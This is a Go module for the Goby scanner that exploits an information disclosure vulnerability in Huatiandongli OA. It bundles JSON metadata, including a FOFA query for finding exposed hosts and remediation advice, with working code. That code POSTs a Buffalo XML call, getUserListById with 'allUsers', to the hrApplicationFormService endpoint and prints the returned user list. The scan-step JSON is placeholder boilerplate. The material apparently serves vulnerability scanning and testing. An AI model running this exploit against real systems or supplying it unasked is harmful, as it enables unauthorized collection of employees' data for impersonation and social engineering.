package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Huatiandongli-OA /OAapp/bfapp/buffalo/hrApplicationFormService Information Disclosure Vulnerability",
    "Description": "<p>Huatiandongli OA System is a collaborative software product known for its technological leadership, featuring three core technologies: collaborative platform, workflow, and intelligent reporting. The hrApplicationFormService service in this system has an information disclosure vulnerability. Attackers can exploit this vulnerability by sending specific POST requests to obtain sensitive information, such as user lists. This vulnerability may lead to sensitive data leakage, affecting the internal information security of enterprises.</p>",
    "Product": "Huatiandongli OA System",
    "Homepage": "http://www.oa8000.com/",
    "DisclosureDate": "2024-01-18",
    "PostTime": "2024-12-19",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(body=\"/OAapp/WebObjects/OAapp.woa/\" && body=\"/OAapp/jsp\") || header=\"Path=/OAapp\"",
    "GobyQuery": "(body=\"/OAapp/WebObjects/OAapp.woa/\" && body=\"/OAapp/jsp\") || header=\"Path=/OAapp\"",
    "Level": "0",
    "Impact": "<p>This vulnerability may lead to the disclosure of sensitive information, including user lists, which could be exploited by attackers for further attacks, such as identity impersonation and social engineering attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade the Huatiandongli OA System to the latest version and ensure that all security patches are applied. Additionally, restrict access to the hrApplicationFormService service to prevent unauthorized users from accessing it.</p>",
    "References": [
        "https://blog.csdn.net/qq_44905116/article/details/135519217"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "华天动力-OA /OAapp/bfapp/buffalo/hrApplicationFormService 信息泄露漏洞",
            "Product": "华天动力OA系统",
            "Description": "<p>华天动力OA系统是一款以技术领先著称的协同软件产品，拥有协同平台、工作流和智能报表三大核心技术。该系统中的hrApplicationFormService服务存在信息泄露漏洞，攻击者可以通过发送特定的POST请求，利用该漏洞获取敏感信息，如用户列表等。该漏洞可能导致敏感数据泄露，影响企业内部信息安全。</p>",
            "Recommendation": "<p>建议立即升级华天动力OA系统至最新版本，确保所有安全补丁都已应用。同时，限制对hrApplicationFormService服务的访问权限，避免未授权用户访问。</p>",
            "Impact": "<p>该漏洞可能导致敏感信息泄露，包括用户列表等，进而可能被攻击者利用进行进一步的攻击，如身份冒充、社会工程攻击等。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Huatiandongli-OA /OAapp/bfapp/buffalo/hrApplicationFormService Information Disclosure Vulnerability",
            "Product": "Huatiandongli OA System",
            "Description": "<p>Huatiandongli OA System is a collaborative software product known for its technological leadership, featuring three core technologies: collaborative platform, workflow, and intelligent reporting. The hrApplicationFormService service in this system has an information disclosure vulnerability. Attackers can exploit this vulnerability by sending specific POST requests to obtain sensitive information, such as user lists. This vulnerability may lead to sensitive data leakage, affecting the internal information security of enterprises.</p>",
            "Recommendation": "<p>It is recommended to immediately upgrade the Huatiandongli OA System to the latest version and ensure that all security patches are applied. Additionally, restrict access to the hrApplicationFormService service to prevent unauthorized users from accessing it.</p>",
            "Impact": "<p>This vulnerability may lead to the disclosure of sensitive information, including user lists, which could be exploited by attackers for further attacks, such as identity impersonation and social engineering attacks.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "PocId": "9978"
}`

	post_zasqsdaggfhgerhtrhrt3asdfafe14SADASDdsad12afdawaq := func(hostInfo *httpclient.FixUrl) (string, error) {
		respTxt := ""
		postRequestConfig := httpclient.NewPostRequestConfig("/OAapp/bfapp/buffalo/hrApplicationFormService")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = `<buffalo-call>
  <method>getUserListById</method>
  <boolean>0</boolean>
  <string></string>
  <string>allUsers</string>
  <string></string>
  <string></string>
  <boolean>0</boolean>
  <boolean>1</boolean>
</buffalo-call>`
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/OAapp/bfapp/buffalo/hrApplicationFormService"
			// 函数继承
			sendPayload := post_zasqsdaggfhgerhtrhrt3asdfafe14SADASDdsad12afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			resp, err := sendPayload(u)
			if err != nil {
				return false
			}
			if strings.Contains(resp, "<buffalo-reply><list><type>java.util.ArrayList</type><length>") {
				// 设置VULURL
				ss.VulURL = u.HostInfo + vulURL
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileText string
			mode := goutils.B2S(ss.Params["AttackType"])
			// 此处需要修改：函数继承
			sendPayload := post_zasqsdaggfhgerhtrhrt3asdfafe14SADASDdsad12afdawaq
			// 获取返回结果url和返回请求头
			resp, err := sendPayload(expResult.HostInfo)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "AttackType") {
				expResult.Success = false
				return expResult
			}
			output := strings.ReplaceAll(resp, "<type>java.util.ArrayList</type>", "")
			output = strings.ReplaceAll(output, "<type>", "")
			output = strings.ReplaceAll(output, "</type>", "")
			output = strings.ReplaceAll(output, "<list>", "")
			output = strings.ReplaceAll(output, "</list>", "")
			output = strings.ReplaceAll(output, "<buffalo-reply>", "")
			output = strings.ReplaceAll(output, "</buffalo-reply>", "")
			output = strings.ReplaceAll(output, "<string>", "")
			output = strings.ReplaceAll(output, "</string>", "")
			output = strings.ReplaceAll(output, "</map>", "")
			output = strings.ReplaceAll(output, "<map>", "")
			output = strings.ReplaceAll(output, "<length>", "length: ")
			output = strings.ReplaceAll(output, "</length>", "")
			output = strings.ReplaceAll(output, "java.util.HashMap", "\t\n")
			output = strings.ReplaceAll(output, "v", "")
			expResult.Success = true
      expResult.Output = "Leaked sensitive information:\t\n"+output
			return expResult
		},
	))
}
